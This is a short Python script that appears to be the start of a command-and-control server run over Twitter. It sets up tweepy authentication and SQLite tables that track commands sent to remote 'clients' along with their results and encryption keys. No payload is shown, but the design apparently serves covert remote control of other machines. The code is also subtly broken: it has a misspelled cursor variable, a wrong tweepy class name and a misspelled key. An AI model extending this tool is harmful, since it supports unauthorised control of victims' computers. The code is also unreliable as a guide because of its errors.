#!/usr/bin/python3

import tweepy, os, base64, _thread, sqlite3
from ast import literal_eval
from subprocess import Popen, PIPE
from termcolor import colored as c
from tweepy import OAuthHandler
# Local libs below
import config
import libs.console as console

# Twitter Auth and API configuration
auth = OAuthHandler(config.keys['consumer_key'],config.keys['consumer_secret'])
auth.set_access_token(config.keys['acess_token'],config.keys['access_secret'])
api = tweepy.api(auth, wait_on_rate_limit=True)

# Database config and first run setup
db = sqlite3.connect("database.db")
cursor = db.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS commands (ID TEXT PRIMARY KEY NOT NULL, RESULT TEXT, RECV INTEGER NOT NULL, SENT INTEGER NOT NULL)") # To store commands and results
cusor.execute("CREATE TABLE IF NOT EXISTS clients (ID TEXT PRIMARY KEY NOT NULL, KEY TEXT NOT NULL, NICK TEXT)") # To store encryption keys for clients and (optionally) nicknames

